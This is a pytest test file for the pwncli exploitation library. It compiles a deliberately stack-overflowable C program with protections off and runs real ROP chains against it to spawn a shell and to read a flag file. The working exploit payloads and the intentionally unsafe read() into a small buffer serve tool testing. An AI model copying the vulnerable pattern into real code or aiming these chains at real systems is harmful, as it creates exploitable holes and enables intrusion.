"""CurrentGadgets 链构造器的端到端真实测试。

这些用例不使用 mock：现场编译一个带栈溢出的二进制，关闭 ASLR 后用
CurrentGadgets.execve_chain / orw_chain 真实打 ROP，验证链构造器在重构后
产出的字节能真正完成 getshell 与读文件。同时覆盖 local_enumerate_attack
装饰器的循环调用机制。

缺少 gcc / patchelf 时整体跳过。

实现要点：CurrentGadgets 默认走 RopgadgetBox，会 fork 出 ROPgadget 子进程。
若在 io=process() 之后才初始化 gadget，该子进程会继承 io 管道的写端，把
"Opcodes information" 之类的输出灌进 io 流，污染接收。因此每个用例都在
创建 tube 之前完成 gadget 初始化（先用占位 libc 基址触发 ROPgadget，再在
tube 起来后回填真实基址；搜索发生在回填之后，缓存的地址即真实地址）。
"""
import shutil
import subprocess
import time

import pytest
from pwn import ELF, context, process, p64, tube

from pwncli import CurrentGadgets, gift
from pwncli.utils.core.exceptions import PwncliExit
from pwncli.utils.toolkit.enumerate_attack import local_enumerate_attack

context.arch = "amd64"
context.log_level = "error"

VULN_SRC = """
#include <unistd.h>
#include <stdio.h>
void vuln(){
    char buf[0x20];
    puts("input:");
    read(0, buf, 0x200);
}
int main(){ vuln(); return 0; }
"""

SYSTEM_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
# 占位基址：仅用于在 tube 创建前通过 __check_before_find 的非零断言并跑起 ROPgadget
_PLACEHOLDER_BASE = 0x7FFFF7C00000


def _have(*tools):
    return all(shutil.which(t) for t in tools)


@pytest.fixture(scope="module")
def vuln_env(tmp_path_factory):
    if not _have("gcc"):
        pytest.skip("gcc not available")
    d = tmp_path_factory.mktemp("orw")
    src = d / "vuln.c"
    src.write_text(VULN_SRC)
    binp = d / "vuln"
    # -fno-stack-protector 关掉 canary，否则溢出触发 __stack_chk_fail
    subprocess.run(
        ["gcc", "-o", str(binp), str(src), "-no-pie", "-z", "lazy",
         "-fno-stack-protector"],
        check=True, stderr=subprocess.DEVNULL)
    flag = d / "flag"
    flag.write_text("flag{orw_chain_works_real}\n")
    return {"bin": str(binp), "flag": str(flag)}


def _libc_base(pid):
    for line in open("/proc/%d/maps" % pid):
        if "libc" in line and "r--p 00000000" in line:
            return int(line.split("-")[0], 16)
    return None


def _prepare_gift_and_gadgets(vuln_env):
    """装填 gift 并在创建 tube 之前完成 gadget 初始化。返回 (elf, libc)。"""
    binp = vuln_env["bin"]
    elf = ELF(binp, checksec=False)
    libc = ELF(SYSTEM_LIBC, checksec=False)
    libc.address = _PLACEHOLDER_BASE
    gift["elf"] = elf
    gift["libc"] = libc
    # reset + 初始化：此时 ROPgadget 子进程在此 fork，尚未有 io 管道可继承
    CurrentGadgets.reset()
    CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=True,
                                 do_initial=True)
    return elf, libc


def test_execve_chain_getshell_real(vuln_env):
    elf, libc = _prepare_gift_and_gadgets(vuln_env)
    io = process(vuln_env["bin"], aslr=False)
    try:
        time.sleep(0.1)
        libc.address = _libc_base(io.pid)  # gift["libc"] 与 __libc 同一对象，回填即生效
        chain = CurrentGadgets.execve_chain()
        ret = CurrentGadgets.find_gadget("c3", "opcode")
        io.recvuntil(b"input:")
        io.send(b"A" * 0x28 + p64(ret) + chain)
        time.sleep(0.3)
        io.sendline(b"echo PWNED_$((6*7))")
        assert b"PWNED_42" in io.recvuntil(b"PWNED_42", timeout=5)
    finally:
        io.close()


def test_orw_chain_read_flag_real(vuln_env):
    elf, libc = _prepare_gift_and_gadgets(vuln_env)
    io = process(vuln_env["bin"], aslr=False)
    try:
        time.sleep(0.1)
        libc.address = _libc_base(io.pid)
        bss = elf.bss() + 0x200
        flag_path = (vuln_env["flag"] + "\x00").encode()
        # 先 read_chain 把文件名拉到 bss，再 orw_chain 开读写
        chain = CurrentGadgets.read_chain(0, bss, len(flag_path)) + \
            CurrentGadgets.orw_chain(flag_addr=bss, buf_addr=bss + 0x40,
                                     flag_fd=3, write_fd=1, buf_len=0x40)
        ret = CurrentGadgets.find_gadget("c3", "opcode")
        io.recvuntil(b"input:")
        io.send(b"A" * 0x28 + p64(ret) + chain)
        time.sleep(0.3)  # 等 ROP 走到 read_chain 的 read(0,...) 再投喂文件名
        io.send(flag_path)
        data = io.recvuntil(b"}", timeout=5)
        assert b"orw_chain_works_real" in data
    finally:
        io.close()


def test_local_enumerate_attack_decorator_real(vuln_env):
    """聚焦装饰器机制：每轮派生新 tube、按 loop_list 笛卡尔积调用、PwncliExit 中断。

    不绑 ROP（链构造器已由前两个用例覆盖），避免 ASLR/接收时序引入的噪声。
    """
    calls = []

    @local_enumerate_attack(argv=vuln_env["bin"], libc_path=SYSTEM_LIBC,
                            loop_time=6)
    def attack(p: tube, libc: ELF):
        # 每轮应拿到一个全新的、能正常交互的 tube
        assert p.recvuntil(b"input:", timeout=3) == b"input:"
        calls.append(1)
        if len(calls) >= 3:
            raise PwncliExit()

    io = process(vuln_env["bin"], aslr=False)
    try:
        # 装饰器按设计吞掉 PwncliExit（"成功即停"信号），故不向上抛；
        # 用 calls 计数验证它在第 3 次中断，而非跑满 loop_time=6
        attack(io, ELF(SYSTEM_LIBC, checksec=False))
    finally:
        io.close()
    assert len(calls) == 3
